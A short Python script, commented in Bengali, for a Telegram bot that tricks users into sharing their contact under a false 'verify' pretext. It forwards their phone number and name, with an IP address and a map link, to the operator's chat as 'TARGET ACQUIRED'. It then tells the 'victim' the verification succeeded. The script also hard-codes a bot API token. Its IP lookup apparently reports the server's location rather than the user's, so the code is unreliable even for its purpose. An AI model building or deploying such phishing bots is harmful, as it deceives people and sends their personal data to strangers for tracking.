import telebot
import requests

# আপনার আপডেট করা তথ্য
API_TOKEN = '8580731044:AAESaTbEO65fLxF3WiZnPtyUTYjajrhkR-I'
MY_ID = '8046944525'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please share your contact to verify.")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    try:
        # IP-API ব্যবহার করে নির্ভুল আইপি ডাটা সংগ্রহ
        response = requests.get("http://ip-api.com/json/").json()
        ip = response.get("query", "N/A")
        city = response.get("city", "Unknown")
        country = response.get("country", "Unknown")
        lat = response.get("lat", "0")
        lon = response.get("lon", "0")
        
        # ডিটেইলস মেসেজ
        text = "🚀 **TARGET ACQUIRED!**\n\n"
        text += f"📱 **Phone:** `{message.contact.phone_number}`\n"
        text += f"👤 **Name:** {message.contact.first_name}\n"
        text += f"🌐 **IP:** `{ip}`\n"
        text += f"📍 **Loc:** {city}, {country}\n"
        text += f"🗺️ **Map:** [Google Maps](https://www.google.com/maps?q={lat},{lon})"
        
        # আপনার আইডিতে তথ্য পাঠানো
        bot.send_message(MY_ID, text, parse_mode="Markdown")
        # ভিকটিমকে সাকসেস মেসেজ দেখানো
        bot.send_message(message.chat.id, "✅ Verification Successful!")
        
    except Exception as e:
        print(f"Error: {e}")

print("Bot is running with New Chat ID...")
bot.polling()
